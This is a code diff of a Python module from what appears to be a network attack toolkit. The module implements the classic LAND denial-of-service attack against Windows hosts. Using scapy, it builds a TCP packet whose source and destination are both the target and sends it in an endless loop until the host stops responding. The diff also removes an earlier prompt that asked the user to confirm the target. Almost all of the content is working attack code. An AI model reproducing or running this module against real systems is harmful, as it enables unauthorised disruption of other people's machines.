@@ -4,44 +4,35 @@ import util
 
 
 class land_dos(DoS):
-    """ Module exploits the Windows LAND attack.  This DoS essentially sends a
-        packet with the source and destination as the target host, so it will
-        send itself packets infinitely until crash.
-
-        http://insecure.org/sploits/land.ip.DOS.html
-    """
     def __init__(self):
         super(land_dos, self).__init__('LAND DoS')
+        conf.verb = 0
+        self.info = """
+                    Oldie but a goodie.  This exploits the classic LAND attack
+                    against Windows machines.  Essentially we set the source 
+                    equal to the destination, which causes a loop and
+                    eventually a crash.
+
+                    http://insecure.org/sploits/land.ip.DOS.html
+                    """
 
     def initialize(self):
-        # supress scapy output
-        conf.verb = 0
+        target = self.config['target']['value']
+        pkt = IP(src=target, dst=target)
+        pkt /= TCP(sport=134, dport=134)
 
-        try:
-            self.get_ip()
-            tmp = raw_input('[!] LAND attack at ip %s.  Is this correct? '
-                                                            % self.target)
-            if 'n' in tmp.lower():
-                return
+        while True:
+            print '[!] DoSing %s...' % target
+            send(pkt)
 
-            pkt = IP(src=self.target, dst=self.target)
-            pkt /= TCP(sport=134, dport=134)
-
-            while True:
-                print '[!] DoSing %s...' % self.target
-                send(pkt)
-
-                if self.is_alive():
-                    util.Msg('Host appears to still be up.')
-                    try:
-                        tmp = raw_input('[!] Try again? ')
-                    except Exception:
-                        break
-                    if 'n' in tmp.lower():
-                        break
-                else:
-                    util.Msg('Host not responding!')
+            if self.is_alive():
+                util.Msg('Host appears to still be up.')
+                try:
+                    tmp = raw_input('[!] Try again? [Y/n] ')
+                except Exception:
                     break
-        except Exception, j:
-            util.Error('Error: %s' % j)
-            return
+                if 'n' in tmp.lower():
+                    break
+            else:
+                util.Msg('Host not responding!')
+                break
